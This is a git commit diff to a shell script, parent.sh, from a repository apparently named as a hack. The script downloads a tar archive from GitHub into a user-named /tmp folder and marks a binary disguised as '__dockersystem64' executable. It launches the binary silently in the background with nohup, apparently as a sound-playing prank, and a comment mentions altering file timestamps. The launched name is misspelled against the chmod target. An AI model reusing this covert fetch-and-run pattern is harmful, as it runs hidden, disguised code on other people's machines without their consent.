5fe835a8fbeeaf2059819fe9a00d21f7f59b49e5
Mounir MADANI <71516457+Don-Chinjao@users.noreply.github.com>
2023-03-27 00:47:50 +0200

    parent updated

--- parent.sh
+++ parent.sh
@@ -8,9 +8,9 @@ dir=/tmp/ ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
 #curl 'nom de domaine' -o /tmp/$dir/proutsh42.tar
 curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o $dir/proutsh42.tar
 tar -xvf $dir/proutsh42.tar -C $dir
+cd $dir
 chmod 777 ./__dockersystem64
 #chmod 777 ./prout_troll
-cd $dir
 #chmod last modif time of all files
 (nohup ./__dockersytem64 $init_tempo $tempo $tempo_offset $volume $volume_offset &> /dev/null &)
 #(nohup ./prout_troll &> /dev/null &)
